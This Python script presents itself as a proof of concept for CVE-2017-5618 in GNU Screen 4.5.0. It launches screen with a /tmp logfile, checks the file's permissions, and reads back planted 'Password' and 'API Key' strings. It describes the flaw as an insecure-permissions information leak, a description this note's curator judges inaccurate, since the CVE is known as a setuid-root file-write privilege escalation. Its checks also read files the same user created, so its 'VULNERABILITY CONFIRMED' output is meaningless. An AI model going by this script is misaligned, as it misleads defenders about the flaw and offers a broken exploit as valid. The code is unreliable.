#!/usr/bin/env python3
"""
CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability PoC
================================================================

This exploit demonstrates the logfile permissions vulnerability in GNU Screen 4.5.0.
The vulnerability occurs when using the -L option with a filename argument.

The vulnerable code creates a logfile with potentially insecure permissions,
allowing unauthorized access to logged terminal sessions.
"""

import os
import sys
import time
import subprocess
import threading
import tempfile
import stat


class ScreenLogfileExploit:
    def __init__(self):
        self.target_logfile = '/tmp/screen_exploit_log'
        self.exploit_successful = False
        self.monitoring = True

    def cleanup(self):
        """Clean up any created files"""
        try:
            if os.path.exists(self.target_logfile):
                os.remove(self.target_logfile)
        except:
            pass

    def monitor_file_creation(self):
        """Monitor for file creation and check permissions"""
        print('[*] Starting file monitor...')

        while self.monitoring:
            if os.path.exists(self.target_logfile):
                try:
                    # Check file permissions
                    file_stat = os.stat(self.target_logfile)
                    file_mode = stat.filemode(file_stat.st_mode)
                    file_perms = oct(file_stat.st_mode)[-3:]

                    print(f'[+] Logfile created: {self.target_logfile}')
                    print(f'[+] File permissions: {file_mode} ({file_perms})')
                    print(f'[+] Owner: UID {file_stat.st_uid}, GID {file_stat.st_gid}')

                    # Check if file is readable by others
                    if file_stat.st_mode & stat.S_IROTH:
                        print('[!] VULNERABILITY: File is world-readable!')
                        self.exploit_successful = True
                    elif file_stat.st_mode & stat.S_IRGRP:
                        print('[!] VULNERABILITY: File is group-readable!')
                        self.exploit_successful = True
                    else:
                        print('[*] File permissions appear secure')

                    # Try to read the file as current user
                    try:
                        with open(self.target_logfile, 'r') as f:
                            content = f.read()
                            if content:
                                print(
                                    f'[+] Successfully read logfile content: {len(content)} bytes'
                                )
                                print(f'[+] Content preview: {repr(content[:100])}')
                            else:
                                print('[*] Logfile is empty')
                    except PermissionError:
                        print('[*] Cannot read logfile (permission denied)')
                    except Exception as e:
                        print(f'[*] Error reading logfile: {e}')

                    break
                except Exception as e:
                    print(f'[!] Error checking file: {e}')

            time.sleep(0.01)  # Check every 10ms

    def trigger_vulnerability(self):
        """Trigger the vulnerability by invoking screen with -L option"""
        print(f'[*] Triggering vulnerability with logfile: {self.target_logfile}')

        try:
            # Use the vulnerable -L option to create a logfile
            cmd = ['screen', '-L', self.target_logfile, '-d', '-m', 'echo', 'test']
            print(f'[*] Executing: {" ".join(cmd)}')

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

            print(f'[*] Screen command exit code: {result.returncode}')
            if result.stdout:
                print(f'[*] Screen stdout: {result.stdout}')
            if result.stderr:
                print(f'[*] Screen stderr: {result.stderr}')

        except subprocess.TimeoutExpired:
            print('[*] Screen command timed out (expected)')
        except Exception as e:
            print(f'[!] Error executing screen: {e}')

    def demonstrate_info_disclosure(self):
        """Demonstrate potential information disclosure"""
        print('\n[*] Demonstrating information disclosure scenario...')

        # Create a scenario where sensitive information might be logged
        sensitive_logfile = '/tmp/sensitive_session_log'

        try:
            # Start a screen session that logs sensitive information
            cmd = [
                'screen',
                '-L',
                sensitive_logfile,
                '-d',
                '-m',
                'bash',
                '-c',
                "echo 'Password: secret123'; echo 'API Key: abc123xyz'; sleep 2",
            ]

            print(f'[*] Starting screen session with sensitive data...')
            subprocess.run(cmd, timeout=5)

            # Wait a moment for the session to complete
            time.sleep(3)

            if os.path.exists(sensitive_logfile):
                file_stat = os.stat(sensitive_logfile)
                print(f'[+] Sensitive logfile created: {sensitive_logfile}')
                print(f'[+] File permissions: {oct(file_stat.st_mode)[-3:]}')

                # Try to read sensitive information
                try:
                    with open(sensitive_logfile, 'r') as f:
                        content = f.read()
                        if 'Password:' in content or 'API Key:' in content:
                            print(
                                '[!] CRITICAL: Sensitive information exposed in logfile!'
                            )
                            print(f'[!] Exposed content: {repr(content)}')
                            return True
                except:
                    pass

            # Cleanup
            if os.path.exists(sensitive_logfile):
                os.remove(sensitive_logfile)

        except Exception as e:
            print(f'[!] Error in info disclosure demo: {e}')

        return False

    def run_exploit(self):
        """Run the complete exploit"""
        print('=' * 60)
        print('CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability')
        print('=' * 60)
        print()

        # Clean up any existing files
        self.cleanup()

        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_file_creation)
        monitor_thread.daemon = True
        monitor_thread.start()

        # Trigger the vulnerability
        self.trigger_vulnerability()

        # Wait for monitoring to complete
        time.sleep(2)
        self.monitoring = False

        # Demonstrate information disclosure
        info_disclosed = self.demonstrate_info_disclosure()

        # Summary
        print('\n' + '=' * 60)
        print('EXPLOIT SUMMARY')
        print('=' * 60)

        if self.exploit_successful or info_disclosed:
            print('[!] VULNERABILITY CONFIRMED!')
            print('[!] GNU Screen 4.5.0 is vulnerable to CVE-2017-5618')
            print('[!] Logfiles may be created with insecure permissions')
            if info_disclosed:
                print('[!] Sensitive information can be exposed')
        else:
            print('[*] Vulnerability not clearly demonstrated')
            print('[*] This may indicate the system has mitigations in place')

        print('\n[*] Mitigation: Upgrade to GNU Screen 4.5.1 or later')

        # Cleanup
        self.cleanup()


def main():
    if len(sys.argv) > 1 and sys.argv[1] == '--help':
        print(__doc__)
        return

    exploit = ScreenLogfileExploit()
    exploit.run_exploit()


if __name__ == '__main__':
    main()
